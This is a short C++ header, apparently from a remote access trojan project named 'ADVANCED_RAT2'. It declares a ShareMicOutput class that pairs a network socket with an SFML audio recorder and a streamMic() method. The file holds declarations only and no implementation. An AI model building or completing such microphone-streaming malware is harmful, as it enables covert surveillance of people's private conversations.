//
// Created by avita on 15/09/2020.
//

#ifndef ADVANCED_RAT2_SHAREMICOUTPUT_H
#define ADVANCED_RAT2_SHAREMICOUTPUT_H

#include <iostream>
#include <SFML/Audio.hpp>
#include <Windows.h>

using namespace std;


class ShareMicOutput {

    SOCKET socket;

    sf::SoundBufferRecorder recorder;


public:

    //Constructor
    ShareMicOutput(SOCKET sock);

    void streamMic();


};


#endif //ADVANCED_RAT2_SHAREMICOUTPUT_H
